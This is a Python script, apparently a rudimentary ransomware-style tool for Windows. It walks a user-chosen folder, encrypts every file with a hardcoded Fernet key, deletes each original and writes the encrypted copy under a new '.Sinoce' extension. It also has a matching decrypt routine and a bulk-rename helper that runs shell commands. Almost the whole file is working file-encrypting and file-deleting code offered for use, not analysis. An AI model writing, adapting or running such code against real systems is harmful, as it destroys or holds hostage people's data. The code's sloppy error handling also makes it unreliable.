from cryptography.fernet import Fernet as frant
from requests import get
from requests import post
from subprocess import check_output as check
from subprocess import getoutput as out
from os import system as sys
from os import system as s
from sys import platform as system
import os
from time import sleep as sp
from colorama import Fore as c

gr = c.GREEN
rd = c.RED
bl = c.BLUE
cy = c.CYAN
mg = c.MAGENTA
yl = c.YELLOW

lgr = c.LIGHTGREEN_EX
lrd = c.LIGHTRED_EX
lbl = c.LIGHTBLUE_EX
lcy = c.LIGHTCYAN_EX
lmg = c.LIGHTMAGENTA_EX
lyl = c.LIGHTYELLOW_EX
black = c.BLACK

s('cls')

def enc():
    addr = input(f"{bl}ENTER ADDRESS{gr} FOLDER {lmg}: {rd}")
    nog = 0
    print(f"{lgr}Encripting Started {lbl}. . .")
    os.chdir(addr)
    files = str(out('dir /s /b ')).split()
    k = b'SFfzdOav26Z3aDpPxaUZELd8MrTwdTkV1zwTJE4eSKA='
    key = frant(k)
    print(f"{lgr}Searching Filles{lbl} ...")
    sp(5)
    for file in files:
        try:
                try:
                    with open(file,'rb') as file_org:
                        read_file = file_org.read()
                except FileNotFoundError:
                    pass
        except PermissionError:
            os.chdir(file)
            files = str(out('dir /s /b *.jpg')).split()
            for fal in files:
                try:
                    with open(fal,'rb') as file_org:
                        read_file = file_org.read()
                except FileNotFoundError:
                    continue
                encript = key.encrypt(read_file)
                print(f'{lgr}Encripting {lrd}'+fal)
                try:
                    os.remove(fal)
                except:
                    continue
                name_file = fal.split('.')
                with open(f'{name_file[0]}','wb') as file_enc:
                    file_enc.write(encript)
                print(f'{lgr}Encripted {lrd}'+fal)
                print(f'{lbl}#'*len(fal))
                nog += 1
        try:
                try:
                    with open(file,'rb') as file_org:
                            read_file = file_org.read()
                except FileNotFoundError:
                    pass
        except PermissionError:
            continue
        os.chdir('.')
        encript = key.encrypt(read_file)
        print(f'{lgr}Encripting {lrd}'+file)
        os.remove(file)
        name_file = file.split('.')
        try:
                try:
                    with open(f'{name_file[0]}.Sinoce','wb') as file_enc:
                        file_enc.write(encript)
                except FileNotFoundError:
                     pass
        except PermissionError:
             continue
        print(f'{lgr}Encripted {lrd}'+file)
        print(f'{lbl}#'*len(file))
        nog += 1
    print(f"{lgr}Number File {lrd}Encripted {lbl}({lrd}{nog}{lbl})")
    

def dec():
    co = 0
    addr = input(f"{bl}ENTER ADDRESS{gr} FOLDER {lmg}:{rd} ")
    ky = b'SFfzdOav26Z3aDpPxaUZELd8MrTwdTkV1zwTJE4eSKA='
    print(f'{lgr}Decripting Started {lbl}. . .')
    os.chdir(addr)
    files = str(out('dir /s /b *')).split()
    key = frant(ky)
    print(f"{lgr}Searching Filles{lbl} ...")
    sp(5)
    for file in files:
        with open(file,'rb') as file_org:
            read_file = file_org.read()
        encript = key.decrypt(read_file)
        print(f'{lgr}Decripting {lrd}'+file)
        os.remove(file)
        name_file = file.split('.')
        with open(f'{name_file[0]}.{name_file[1]}','wb') as file_enc:
            file_enc.write(encript)
        print(f'{lgr}Decripted {lrd}'+file)
        print('#'*len(file))
        co +=1
    print(f"{lgr}Number File {lrd}Decripted {lbl}({lrd}{co}{lbl})")
def ren():
    loc = input(f'{lbl}ENTER ADDRESS {lmg}RENAME FILES : {rd}')
    one = input(f"{bl}ENTER FORMAT{lmg} FILLES : {rd}")
    rn = input(f"{bl}ENTER RENAME FILE{lmg} FORMAT : {rd}")
    os.chdir(loc)
    s(f'ren *.{one} *.{rn}')
    
